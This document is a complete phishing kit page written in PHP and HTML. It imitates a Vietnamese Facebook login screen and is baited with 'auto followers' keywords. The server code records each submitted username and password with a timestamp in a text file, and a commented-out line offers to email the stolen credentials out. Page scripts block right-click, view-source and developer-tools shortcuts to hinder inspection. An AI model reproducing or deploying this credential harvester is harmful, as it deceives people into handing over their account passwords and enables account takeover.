<?php
session_start();
if(isset($_SESSION['facebook'])){
    header('location: /');
    die();
}
if(isset($_POST['account'])){
    $taikhoan = $_POST['taikhoan'];
    $matkhau = $_POST['matkhau'];
    $time = date('h:i:s y-m-d');
    $_SESSION['facebook'] = $taikhoan;
    $file = fopen("accdayroi.txt","a+");
    fwrite($file, ''.$taikhoan.'|'.$matkhau.'|'.$time);
    fwrite($file, "\n");
    fclose($file); 
    // nếu muốn gửi mail thì bỏ // lè
    // $message = ''.$taikhoan.'|'.$matkhau.'|'.$time;
    // mail('mail@gmail.com', 'Ơn giời facebook đây rồi', $message);
    echo ("<script>location.href='/'</script>");
}
$time = time();
?>
<!DOCTYPE html>
<html>
<head>
<meta content='width=device-width, initial-scale=1' name='viewport' />
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
<title>Facebook - Đăng nhập hoặc đăng ký</title>
<meta name="search engines" content="Aeiwi, Alexa, AllTheWeb, AltaVista, AOL Netfind, Anzwers, Canada, DirectHit, EuroSeek, Excite, Overture, Go, Google, HotBot. InfoMak, Kanoodle, Lycos, MasterSite, National Directory, Northern Light, SearchIt, SimpleSearch, WebsMostLinked, WebTop, What-U-Seek, AOL, Yahoo, WebCrawler, Infoseek, Excite, Magellan, LookSmart, bing, CNET, Googlebot" />
<meta property="og:type" content="website" />
<meta property="og:title" content="Đăng nhập FacebookZ | FacebookZ">
<meta property="og:description" content="Hãy đăng nhập FacebookZ để bắt đầu chia sẻ và kết nối với bạn bè, gia đình và những người bạn biết.">
<meta name="description" content="Hãy đăng nhập FacebookZ để bắt đầu chia sẻ và kết nối với bạn bè, gia đình và những người bạn biết." />
<meta name="keywords" content="auto followers, auto follower, Free increase unlimite followers, best auto follower, autofollower, followers" />
<meta name="robots" content="index, follow" />
<meta name="robot" content="index, follow" />
<meta name="googlebot" content="index, follow" />
<meta name="YandexBot" content="index, follow" />
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
<link class="tempLink" rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:regular">
<script src='//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js' type="text/javascript"></script>
<link rel="stylesheet" href="../assets/style.css?<?=$time;?>">
</head>
<body id="vohuunhan" onselectstart="return false" oncontextmenu="return false">
<div class="container">
<div class="d-flex justify-content-center">.
<img src="../assets/img/dF5SId3UHWd (2) (1).svg" class="img logo mt-2" alt="FacebookZ">
</div>
<div class="row h-100 justify-content-center align-items-center mt-2">
<div class="col-md-4 vhnlog">
<form action="login.php" method="POST">
<div class="form-group">
<input type="text" class="form-control" name="taikhoan" placeholder="Vui lòng nhập số di động hoặc email" required>
</div>
<div class="form-group">
<input type="password" class="form-control" name="matkhau" placeholder="Password" required>
</div>
<div class="form-group">
<center>
<button name="account" type="submit" class="btn btn-primary btn-block">Đăng nhập</button>
</center>
</div>
</form>
<div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">hoặc</span></div>
<center>
<input class="btn btn-success" type="button" value="Tạo tài khoản mới" />
</center>
</div>
</div>
<div class="row text-center" style="margin-top: 6rem;">
<div class="col">
<small class="text-muted">Tiếng Việt</small><br />
<small class="blue">English (US)</small>
</div>
<div class="col">
<small class="blue">Hindi (IN)</small>
<br />
<i class="far fa-plus-square"></i>
</div>
</div>
<div class="row text-center">
<div class="col-md-12">
<small class="text-muted">Facebook, Inc.</small>
</div
  </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous" type="text/javascript"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous" type="text/javascript"></script>
<script type="text/javascript">
      window.onload = function () {
           document.addEventListener("contextmenu", function (e) {
               e.preventDefault();
           }, false);
           document.addEventListener("keydown", function (e) {
               if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
                   disabledEvent(e);
               }
               // "J" key
               if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
                   disabledEvent(e);
               }
               // "S" key + macOS
               if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
                   disabledEvent(e);
               }
               // "U" key
               if (e.ctrlKey && e.keyCode == 85) {
                   disabledEvent(e);
               }
               // "F12" key
               if (event.keyCode == 123) {
                   disabledEvent(e);
               }
           }, false);
           function disabledEvent(e) {
               if (e.stopPropagation) {
                   e.stopPropagation();
               } else if (window.event) {
                   window.event.cancelBubble = true;
               }
               e.preventDefault();
               return false;
           }
       }
</script>
<script type='text/javascript'>
//<![CDATA[
shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="/"}),shortcut.add("F12",function(){top.location.href="/"}),shortcut.add("Ctrl+Shift+I",function(){top.location.href="/"}),shortcut.add("Ctrl+S",function(){top.location.href="/"}),shortcut.add("Ctrl+Shift+C",function(){top.location.href="/"});
//]]>
</script>

<script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7089c43e/cloudflare-static/rocket-loader.min.js" data-cf-settings="|49" defer=""></script></body>
</html>
